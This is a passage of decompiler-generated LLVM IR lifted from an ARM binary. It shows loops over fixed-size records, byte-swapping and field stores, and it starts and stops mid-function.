  store i32 %v3_c0e4, i32* %r0.global-to-local, align 4
  %v3_c0e8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c0e8, i32* %r3.global-to-local, align 4
  %v1_c0ec = add i32 %v3_c0e8, 1
  store i32 %v1_c0ec, i32* @r4, align 4
  %v1_c0f0 = load i32, i32* @r7, align 4
  %v9_c0f0 = icmp eq i32 %v1_c0ec, %v1_c0f0
  store i1 %v9_c0f0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c0ec, i32* %stack_var_-44, align 4
  %v5_c0f8 = icmp slt i32 %v1_c0ec, %v1_c0f0
  br i1 %v5_c0f8, label %dec_label_pc_bf94, label %dec_label_pc_c0fc

dec_label_pc_c0fc:                                ; preds = %bb70
  store i32 %v6_be24, i32* %r3.global-to-local, align 4
  %v1_c100 = add i32 %v6_be24, 20
  store i32 %v1_c100, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_c108

dec_label_pc_c108:                                ; preds = %dec_label_pc_c34c, %dec_label_pc_c0fc
  %v0_c1208 = phi i32 [ %v1_c0f0, %dec_label_pc_c0fc ], [ 0, %dec_label_pc_c34c ]
  %stack_var_-140.0 = phi i32 [ %v3_bee4, %dec_label_pc_c0fc ], [ %v3_c358, %dec_label_pc_c34c ]
  %storemerge = add i32 %v6_be24, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_c10c = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_c10c, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_c10c, 256
  %v3_c114 = and i32 %tmp71, 65280
  store i32 %v3_c114, i32* %r3.global-to-local, align 4
  %v4_c118 = udiv i32 %v1_c10c, 16777216
  %v5_c118 = or i32 %v3_c114, %v4_c118
  store i32 %v5_c118, i32* @sl, align 4
  %v3_c2b8 = icmp eq i32 %v3_bebc, 65535
  %v2_c31c = icmp eq i32 %v1_be4c, 0
  %v2_c158 = icmp eq i32 %v6_be60, -1
  %v7_c158 = icmp eq i32 %v6_be60, -1
  br label %dec_label_pc_c11c

dec_label_pc_c11c:                                ; preds = %dec_label_pc_c11c, %dec_label_pc_c234, %dec_label_pc_c108
  %v0_c120 = phi i32 [ %v0_c1208, %dec_label_pc_c108 ], [ 0, %dec_label_pc_c234 ], [ 0, %dec_label_pc_c11c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c120 = icmp eq i32 %v0_c120, 0
  store i1 %v2_c120, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c120, label %dec_label_pc_c11c, label %dec_label_pc_c12c

dec_label_pc_c12c:                                ; preds = %dec_label_pc_c11c, %dec_label_pc_c234
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c130

dec_label_pc_c130:                                ; preds = %dec_label_pc_c1b0, %dec_label_pc_c12c
  %v1_c144 = phi i32 [ %v1_c224, %dec_label_pc_c1b0 ], [ 0, %dec_label_pc_c12c ]
  %v5_c134 = mul i32 %v1_c144, 24
  %v1_c138 = load i32, i32* @r8, align 4
  %v2_c138 = add i32 %v1_c138, %v5_c134
  store i32 %v2_c138, i32* %r3.global-to-local, align 4
  store i32 %v2_bc90, i32* %ip.global-to-local, align 4
  %v1_c140 = add i32 %v2_c138, 20
  %v2_c140 = inttoptr i32 %v1_c140 to i8*
  %v3_c140 = load i8, i8* %v2_c140, align 1
  %v4_c140 = zext i8 %v3_c140 to i32
  store i32 %v4_c140, i32* %r2.global-to-local, align 4
  %v4_c144 = mul i32 %v1_c144, 4
  %v5_c144 = add i32 %v4_c144, %v2_bc90
  %v6_c144 = inttoptr i32 %v5_c144 to i32*
  %v7_c144 = load i32, i32* %v6_c144, align 4
  store i32 %v7_c144, i32* @r5, align 4
  %v7_c148 = icmp eq i8 %v3_c140, 31
  store i1 %v7_c148, i1* %cpsr_z.global-to-local, align 1
  %v1_c14c = add i32 %v7_c144, 20
  store i32 %v1_c14c, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_c140, 32
  br i1 %tmp77, label %dec_label_pc_c248, label %dec_label_pc_c154

dec_label_pc_c154:                                ; preds = %dec_label_pc_c130
  store i32 %v6_be60, i32* %r0.global-to-local, align 4
  store i1 %v7_c158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c158, label %dec_label_pc_c2a8, label %dec_label_pc_c160

dec_label_pc_c160:                                ; preds = %dec_label_pc_c248, %dec_label_pc_c154
  store i32 %v3_bebc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c2b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c2b8, label %dec_label_pc_c2c4, label %dec_label_pc_c174

dec_label_pc_c174:                                ; preds = %dec_label_pc_c2a8.dec_label_pc_c174_crit_edge, %dec_label_pc_c160
  %v1_c178 = phi i32 [ %v1_c178.pre, %dec_label_pc_c2a8.dec_label_pc_c174_crit_edge ], [ 65535, %dec_label_pc_c160 ]
  store i32 %v3_bec0, i32* %r2.global-to-local, align 4
  %v9_c178 = icmp eq i32 %v3_bec0, %v1_c178
  store i1 %v9_c178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c178, label %dec_label_pc_c2d8, label %dec_label_pc_c180

dec_label_pc_c180:                                ; preds = %dec_label_pc_c2c4.dec_label_pc_c180_crit_edge, %dec_label_pc_c174
  %v1_c184 = phi i32 [ %v1_c184.pre, %dec_label_pc_c2c4.dec_label_pc_c180_crit_edge ], [ %v1_c178, %dec_label_pc_c174 ]
  store i32 %v3_bec4, i32* %r3.global-to-local, align 4
  %v9_c184 = icmp eq i32 %v3_bec4, %v1_c184
  store i1 %v9_c184, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c184, label %dec_label_pc_c2ec, label %dec_label_pc_c18c

dec_label_pc_c18c:                                ; preds = %dec_label_pc_c2d8.dec_label_pc_c18c_crit_edge, %dec_label_pc_c180
  %v1_c190 = phi i32 [ %v1_c190.pre, %dec_label_pc_c2d8.dec_label_pc_c18c_crit_edge ], [ %v1_c184, %dec_label_pc_c180 ]
  store i32 %v5_bd60, i32* %ip.global-to-local, align 4
  %v9_c190 = icmp eq i32 %v5_bd60, %v1_c190
  store i1 %v9_c190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c190, label %dec_label_pc_c300, label %dec_label_pc_c198

dec_label_pc_c198:                                ; preds = %dec_label_pc_c2ec.dec_label_pc_c198_crit_edge, %dec_label_pc_c18c
  %v1_c19c = phi i32 [ %v1_c19c.pre, %dec_label_pc_c2ec.dec_label_pc_c198_crit_edge ], [ %v1_c190, %dec_label_pc_c18c ]
  store i32 %v6_bd7c, i32* %r0.global-to-local, align 4
  %v9_c19c = icmp eq i32 %v6_bd7c, %v1_c19c
  store i1 %v9_c19c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c19c, label %dec_label_pc_c314, label %dec_label_pc_c1a4

dec_label_pc_c1a4:                                ; preds = %dec_label_pc_c300, %dec_label_pc_c198
  store i32 %v1_be4c, i32* %r1.global-to-local, align 4
  store i1 %v2_c31c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c31c, label %dec_label_pc_c1b0, label %dec_label_pc_c328

dec_label_pc_c1b0:                                ; preds = %dec_label_pc_c1a4, %dec_label_pc_c314, %dec_label_pc_c328
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c1b4 = load i32, i32* @r5, align 4
  %v3_c1b4 = add i32 %v2_c1b4, 10
  %v4_c1b4 = inttoptr i32 %v3_c1b4 to i16*
  store i16 0, i16* %v4_c1b4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c1bc = load i32, i32* @r5, align 4
  store i32 %v0_c1bc, i32* @r0, align 4
  %v2_c1c0 = call i32 @function_dc98(i32 %v0_c1bc, i32 20)
  %v3_c1c0 = trunc i32 %v2_c1c0 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c1c8 = load i32, i32* @r5, align 4
  %v4_c1c8 = add i32 %v3_c1c8, 10
  %v5_c1c8 = inttoptr i32 %v4_c1c8 to i16*
  store i16 %v3_c1c0, i16* %v5_c1c8, align 2
  %v0_c1cc = load i32, i32* @r6, align 4
  store i32 %v0_c1cc, i32* @r1, align 4
  %v0_c1d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c1d0 = trunc i32 %v0_c1d0 to i16
  %v3_c1d0 = add i32 %v0_c1cc, 16
  %v4_c1d0 = inttoptr i32 %v3_c1d0 to i16*
  store i16 %v1_c1d0, i16* %v4_c1d0, align 2
  %v0_c1d4 = load i32, i32* @sl, align 4
  store i32 %v0_c1d4, i32* %r2.global-to-local, align 4
  %v0_c1d8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_c1d8, i32* %r3.global-to-local, align 4
  %v0_c1dc = load i32, i32* @r5, align 4
  store i32 %v0_c1dc, i32* %r0.global-to-local, align 4
  %v4_c1e0 = call i32 @function_dce8(i32 %v0_c1dc, i32 %v0_c1cc, i32 %v0_c1d4, i32 %v0_c1d8)
  %v5_c1e0 = trunc i32 %v4_c1e0 to i16
  store i32 %v4_c1e0, i32* %r0.global-to-local, align 4
  %v3_c1e4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c1e4, i32* %r3.global-to-local, align 4
  %v3_c1e8 = mul i32 %v3_c1e4, 32
  store i32 %v3_c1e8, i32* %lr.global-to-local, align 4
  %v3_c1ec = load i32, i32* @r6, align 4
  %v4_c1ec = add i32 %v3_c1ec, 16
  %v5_c1ec = inttoptr i32 %v4_c1ec to i16*
  store i16 %v5_c1e0, i16* %v5_c1ec, align 2
  %v0_c1f0 = load i32, i32* %lr.global-to-local, align 4
  %v1_c1f0 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_c1f0, -8
  %v5_c1f0 = add i32 %v0_c1f0, %tmp78
  store i32 %v5_c1f0, i32* %lr.global-to-local, align 4
  %v0_c1f4 = load i32, i32* @r6, align 4
  %v1_c1f4 = add i32 %v0_c1f4, 2
  %v2_c1f4 = inttoptr i32 %v1_c1f4 to i16*
  %v3_c1f4 = load i16, i16* %v2_c1f4, align 2
  %v1_c1f8 = load i32, i32* @r8, align 4
  %v2_c1f8 = add i32 %v1_c1f8, %v5_c1f0
  store i32 %v2_c1f8, i32* @lr, align 4
  %v3_c1fc = add i32 %v2_c1f8, 2
  %v4_c1fc = inttoptr i32 %v3_c1fc to i16*
  store i16 %v3_c1f4, i16* %v4_c1fc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c208 = load i32, i32* @r5, align 4
  store i32 %v0_c208, i32* %r1.global-to-local, align 4
  store i32 %v3_be74, i32* %r0.global-to-local, align 4
  %v0_c210 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_c210, i32* %r2.global-to-local, align 4
  %v0_c214 = load i32, i32* @lr, align 4
  %v6_c21c = call i32 @function_138bc(i32 %v3_be74, i32 %v0_c208, i32 %v0_c210, i32 16384, i32 %v0_c214, i32 16)
  %v3_c220 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c220, i32* %r3.global-to-local, align 4
  %v1_c224 = add i32 %v3_c220, 1
  store i32 %v1_c224, i32* %r0.global-to-local, align 4
  %v1_c228 = load i32, i32* @r7, align 4
  %v9_c228 = icmp eq i32 %v1_c224, %v1_c228
  store i1 %v9_c228, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c224, i32* %stack_var_-44, align 4
  %v5_c230 = icmp slt i32 %v1_c224, %v1_c228
  br i1 %v5_c230, label %dec_label_pc_c130, label %dec_label_pc_c234

dec_label_pc_c234:                                ; preds = %dec_label_pc_c1b0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c238 = icmp eq i32 %v1_c228, 0
  store i1 %v2_c238, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c238, label %dec_label_pc_c11c, label %dec_label_pc_c12c

dec_label_pc_c248:                                ; preds = %dec_label_pc_c130
  %v1_c248 = add i32 %v2_c138, 16
  %v2_c248 = inttoptr i32 %v1_c248 to i32*
  %v3_c248 = load i32, i32* %v2_c248, align 4
  %v0_c24c = call i32 @function_f700()
  store i32 %v0_c24c, i32* %r0.global-to-local, align 4
  %v3_c250 = load i32, i32* %stack_var_-44, align 4
  %v5_c258 = mul i32 %v3_c250, 24
  %v1_c25c = and i32 %v3_c248, 16711680
  store i32 %v1_c25c, i32* %ip.global-to-local, align 4
  %v3_c260 = udiv i32 %v3_c248, 16777216
  %v4_c264 = udiv i32 %v1_c25c, 256
  %v5_c264 = or i32 %v4_c264, %v3_c260
  store i32 %v5_c264, i32* %r2.global-to-local, align 4
  %v1_c268 = load i32, i32* @r8, align 4
  %v2_c268 = add i32 %v1_c268, %v5_c258
  store i32 %v2_c268, i32* %r1.global-to-local, align 4
  %v1_c26c = and i32 %v3_c248, 65280
  store i32 %v1_c26c, i32* %r3.global-to-local, align 4
  %v1_c270 = add i32 %v2_c268, 20
  %v2_c270 = inttoptr i32 %v1_c270 to i8*
  %v3_c270 = load i8, i8* %v2_c270, align 1
  %v4_c270 = zext i8 %v3_c270 to i32
  store i32 %v4_c270, i32* %ip.global-to-local, align 4
  %v5_c278 = call i32 @llvm.bswap.i32(i32 %v3_c248)
  %v7_c27c = lshr i32 %v0_c24c, %v4_c270
  %v8_c27c = add i32 %v7_c27c, %v5_c278
  store i32 %v8_c27c, i32* %r2.global-to-local, align 4
  %v1_c28c = and i32 %v8_c27c, 65280
  store i32 %v1_c28c, i32* %r1.global-to-local, align 4
  store i32 %v6_be60, i32* %r0.global-to-local, align 4
  %v5_c298 = call i32 @llvm.bswap.i32(i32 %v8_c27c)
  store i32 %v5_c298, i32* %r3.global-to-local, align 4
  store i1 %v7_c158, i1* %cpsr_z.global-to-local, align 1
  %v1_c2a0 = load i32, i32* @r5, align 4
  %v2_c2a0 = add i32 %v1_c2a0, 16
  %v3_c2a0 = inttoptr i32 %v2_c2a0 to i32*
  store i32 %v5_c298, i32* %v3_c2a0, align 4
  br i1 %v2_c158, label %dec_label_pc_c2a8, label %dec_label_pc_c160

dec_label_pc_c2a8:                                ; preds = %dec_label_pc_c248, %dec_label_pc_c154
  %v0_c2a8 = call i32 @function_f700()
  store i32 %v0_c2a8, i32* %r0.global-to-local, align 4
  store i32 %v3_bebc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c2b8, i1* %cpsr_z.global-to-local, align 1
  %v1_c2bc = load i32, i32* @r5, align 4
  %v2_c2bc = add i32 %v1_c2bc, 12
  %v3_c2bc = inttoptr i32 %v2_c2bc to i32*
  store i32 %v0_c2a8, i32* %v3_c2bc, align 4
  br i1 %v3_c2b8, label %dec_label_pc_c2c4, label %dec_label_pc_c2a8.dec_label_pc_c174_crit_edge

dec_label_pc_c2a8.dec_label_pc_c174_crit_edge:    ; preds = %dec_label_pc_c2a8
  %v1_c178.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c174

dec_label_pc_c2c4:                                ; preds = %dec_label_pc_c2a8, %dec_label_pc_c160
  %v0_c2c4 = call i32 @function_f700()
  %v1_c2c4 = trunc i32 %v0_c2c4 to i16
  store i32 %v0_c2c4, i32* %r0.global-to-local, align 4
  store i32 %v3_bec0, i32* %r2.global-to-local, align 4
  %v1_c2cc = load i32, i32* @r4, align 4
  %v9_c2cc = icmp eq i32 %v3_bec0, %v1_c2cc
  store i1 %v9_c2cc, i1* %cpsr_z.global-to-local, align 1
  %v3_c2d0 = load i32, i32* @r5, align 4
  %v4_c2d0 = add i32 %v3_c2d0, 4
  %v5_c2d0 = inttoptr i32 %v4_c2d0 to i16*
  store i16 %v1_c2c4, i16* %v5_c2d0, align 2
  br i1 %v9_c2cc, label %dec_label_pc_c2d8, label %dec_label_pc_c2c4.dec_label_pc_c180_crit_edge

dec_label_pc_c2c4.dec_label_pc_c180_crit_edge:    ; preds = %dec_label_pc_c2c4
  %v1_c184.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c180

dec_label_pc_c2d8:                                ; preds = %dec_label_pc_c2c4, %dec_label_pc_c174
  %v0_c2d8 = call i32 @function_f700()
  %v1_c2d8 = trunc i32 %v0_c2d8 to i16
  store i32 %v0_c2d8, i32* %r0.global-to-local, align 4
  store i32 %v3_bec4, i32* %r3.global-to-local, align 4
  %v1_c2e0 = load i32, i32* @r4, align 4
  %v9_c2e0 = icmp eq i32 %v3_bec4, %v1_c2e0
  store i1 %v9_c2e0, i1* %cpsr_z.global-to-local, align 1
  %v3_c2e4 = load i32, i32* @r5, align 4
  %v4_c2e4 = add i32 %v3_c2e4, 20
  %v5_c2e4 = inttoptr i32 %v4_c2e4 to i16*
  store i16 %v1_c2d8, i16* %v5_c2e4, align 2
  br i1 %v9_c2e0, label %dec_label_pc_c2ec, label %dec_label_pc_c2d8.dec_label_pc_c18c_crit_edge

dec_label_pc_c2d8.dec_label_pc_c18c_crit_edge:    ; preds = %dec_label_pc_c2d8
  %v1_c190.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c18c

dec_label_pc_c2ec:                                ; preds = %dec_label_pc_c2d8, %dec_label_pc_c180
  %v0_c2ec = call i32 @function_f700()
  %v1_c2ec = trunc i32 %v0_c2ec to i16
  store i32 %v0_c2ec, i32* %r0.global-to-local, align 4
  store i32 %v5_bd60, i32* %ip.global-to-local, align 4
  %v1_c2f4 = load i32, i32* @r4, align 4
  %v9_c2f4 = icmp eq i32 %v5_bd60, %v1_c2f4
  store i1 %v9_c2f4, i1* %cpsr_z.global-to-local, align 1
  %v3_c2f8 = load i32, i32* @r6, align 4
  %v4_c2f8 = add i32 %v3_c2f8, 2
  %v5_c2f8 = inttoptr i32 %v4_c2f8 to i16*
  store i16 %v1_c2ec, i16* %v5_c2f8, align 2
  br i1 %v9_c2f4, label %dec_label_pc_c300, label %dec_label_pc_c2ec.dec_label_pc_c198_crit_edge

dec_label_pc_c2ec.dec_label_pc_c198_crit_edge:    ; preds = %dec_label_pc_c2ec
  %v1_c19c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c198

dec_label_pc_c300:                                ; preds = %dec_label_pc_c2ec, %dec_label_pc_c18c
  %v0_c300 = call i32 @function_f700()
  %v1_c304 = load i32, i32* @r6, align 4
  %v2_c304 = add i32 %v1_c304, 4
  %v3_c304 = inttoptr i32 %v2_c304 to i32*
  store i32 %v0_c300, i32* %v3_c304, align 4
  store i32 %v6_bd7c, i32* %r0.global-to-local, align 4
  %v1_c30c = load i32, i32* @r4, align 4
  %v9_c30c = icmp eq i32 %v6_bd7c, %v1_c30c
  store i1 %v9_c30c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c30c, label %dec_label_pc_c314, label %dec_label_pc_c1a4

dec_label_pc_c314:                                ; preds = %dec_label_pc_c300, %dec_label_pc_c198
  %v0_c314 = call i32 @function_f700()
  store i32 %v0_c314, i32* %r0.global-to-local, align 4
  store i32 %v1_be4c, i32* %r1.global-to-local, align 4
  store i1 %v2_c31c, i1* %cpsr_z.global-to-local, align 1
  %v1_c320 = load i32, i32* @r6, align 4
  %v2_c320 = add i32 %v1_c320, 8
  %v3_c320 = inttoptr i32 %v2_c320 to i32*
  store i32 %v0_c314, i32* %v3_c320, align 4
  br i1 %v2_c31c, label %dec_label_pc_c1b0, label %dec_label_pc_c328

dec_label_pc_c328:                                ; preds = %dec_label_pc_c1a4, %dec_label_pc_c314
  %v0_c328 = load i32, i32* @r5, align 4
  %v1_c328 = add i32 %v0_c328, 40
  store i32 %v1_c328, i32* %r0.global-to-local, align 4
  store i32 %v6_be24, i32* %r1.global-to-local, align 4
  %v2_c330 = inttoptr i32 %v1_c328 to i16*
  %v3_c330 = call i32 @function_f900(i16* %v2_c330, i32 %v6_be24)
  store i32 %v3_c330, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c1b0

dec_label_pc_c338:                                ; preds = %dec_label_pc_be84
  store i32 %v3_be74, i32* %r0.global-to-local, align 4
  %v1_c33c = call i32 @function_1314c(i32 %v3_be74)
  store i32 %v1_c33c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c340

dec_label_pc_c340:                                ; preds = %dec_label_pc_bc74, %dec_label_pc_c338
  %v1_c348 = phi i32 [ %v3_be74, %dec_label_pc_bc74 ], [ %v1_c33c, %dec_label_pc_c338 ]
  store i32 %v18_bc74, i32* %sb.global-to-local, align 4
  store i32 %v24_bc74, i32* %fp.global-to-local, align 4
  store i32 %v27_bc74, i32* %lr.global-to-local, align 4
  ret i32 %v1_c348

dec_label_pc_c34c:                                ; preds = %dec_label_pc_beac
  store i32 %v6_be24, i32* %r0.global-to-local, align 4
  %v1_c354 = add i32 %v6_be24, 20
  store i32 %v1_c354, i32* %sb.global-to-local, align 4
  %v3_c358 = mul i32 %v6_be24, 65536
  store i32 %v3_c358, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c108

; uselistorder directives
  uselistorder i32 %v0_c2ec, { 1, 0 }
  uselistorder i32 %v0_c2d8, { 1, 0 }
  uselistorder i32 %v0_c2c4, { 1, 0 }
  uselistorder i32 %v5_c298, { 1, 0 }
  uselistorder i32 %v3_c248, { 2, 1, 3, 0 }
  uselistorder i32 %v1_c224, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c1f0, { 1, 0 }
  uselistorder i32 %v4_c1e0, { 1, 0 }
  uselistorder i1 %v7_c158, { 2, 1, 0 }
  uselistorder i1 %v2_c31c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c2b8, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_c0ec, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c0c0, { 1, 0 }
  uselistorder i32 %v1_bf74, { 1, 2, 0 }
  uselistorder i32 %v1_bf70, { 2, 1, 0 }
  uselistorder i32 %v1_bf6c, { 2, 0, 1 }
  uselistorder i32 %v1_bf68, { 2, 0, 1 }
  uselistorder i32 %v1_bf64, { 2, 0, 1 }
  uselistorder i32 %v1_bf3c, { 1, 0 }
  uselistorder i32 %v3_bee4, { 1, 0 }
  uselistorder i32 %v3_bebc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_beb4, { 1, 0, 2 }
  uselistorder i32 %v0_beb0, { 1, 0, 2 }
  uselistorder i32 %v0_beac, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bea4, { 1, 0 }
  uselistorder i1 %v7_be78, { 1, 0 }
  uselistorder i32 %v3_be74, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_be60, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_be4c, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_be24, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_bd7c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_bd60, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_bd10, { 1, 0 }
  uselistorder i32 %v2_bc90, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 37, 36, 39, 38, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 27, 23, 24, 25, 26, 31, 28, 29, 30, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c340, { 1, 0 }
  uselistorder label %dec_label_pc_c328, { 1, 0 }
  uselistorder label %dec_label_pc_c1b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c12c, { 1, 0 }
  uselistorder label %dec_label_pc_c11c, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c36c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c36c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c36c = load i32, i32* @r4, align 4
  %v24_c36c = load i32, i32* @fp, align 4
  %v27_c36c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_c388 = call i32 @function_144a8(i32 %arg1, i32 4)
  %v0_c38c = load i32, i32* @r5, align 4
  store i32 %v0_c38c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c388, i32* @sb, align 4
  %v0_c39c = load i32, i32* @r4, align 4
  store i32 %v0_c39c, i32* %r0.global-to-local, align 4
  %v4_c3a0 = inttoptr i32 %v0_c38c to i32*
  %v5_c3a0 = call i32 @function_a45c(i32 %v0_c39c, i32* %v4_c3a0, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c3b8 = load i32, i32* @r5, align 4
  store i32 %v0_c3b8, i32* %r1.global-to-local, align 4
  %v0_c3bc = load i32, i32* @r4, align 4
  store i32 %v0_c3bc, i32* %r0.global-to-local, align 4
  %v5_c3c0 = trunc i32 %v5_c3a0 to i8
  %v6_c3c4 = inttoptr i32 %v0_c3b8 to i32*
  %v7_c3c4 = call i32 @function_a45c(i32 %v0_c3bc, i32* %v6_c3c4, i32 3, i32 65535)
  %v0_c3c8 = load i32, i32* @r5, align 4
  store i32 %v0_c3c8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c3d8 = load i32, i32* @r4, align 4
  store i32 %v0_c3d8, i32* %r0.global-to-local, align 4
  %v5_c3dc = inttoptr i32 %v0_c3c8 to i32*
  %v6_c3dc = call i32 @function_a45c(i32 %v0_c3d8, i32* %v5_c3dc, i32 4, i32 64)
  %v1_c3e4 = urem i32 %v6_c3dc, 256
  %v0_c3e8 = load i32, i32* @r5, align 4
  store i32 %v0_c3e8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c3f4 = load i32, i32* @r4, align 4
  store i32 %v0_c3f4, i32* %r0.global-to-local, align 4
  %v6_c3fc = inttoptr i32 %v0_c3e8 to i32*
  %v7_c3fc = call i32 @function_a45c(i32 %v0_c3f4, i32* %v6_c3fc, i32 5, i32 1)
  %v1_c408 = urem i32 %v7_c3fc, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c414 = load i32, i32* @r5, align 4
  store i32 %v0_c414, i32* %r1.global-to-local, align 4
  %v0_c418 = load i32, i32* @r4, align 4
  store i32 %v0_c418, i32* %r0.global-to-local, align 4
  %v5_c420 = inttoptr i32 %v0_c414 to i32*
  %v6_c420 = call i32 @function_a45c(i32 %v0_c418, i32* %v5_c420, i32 6, i32 65535)
  %v0_c428 = load i32, i32* @r5, align 4
  store i32 %v0_c428, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c420, i32* %fp.global-to-local, align 4
  %v0_c438 = load i32, i32* @r4, align 4
  store i32 %v0_c438, i32* %r0.global-to-local, align 4
  %v4_c43c = inttoptr i32 %v0_c428 to i32*
  %v5_c43c = call i32 @function_a45c(i32 %v0_c438, i32* %v4_c43c, i32 7, i32 65535)
  %v0_c444 = load i32, i32* @r5, align 4
  store i32 %v0_c444, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c43c, i32* @r6, align 4
  %v0_c454 = load i32, i32* @r4, align 4
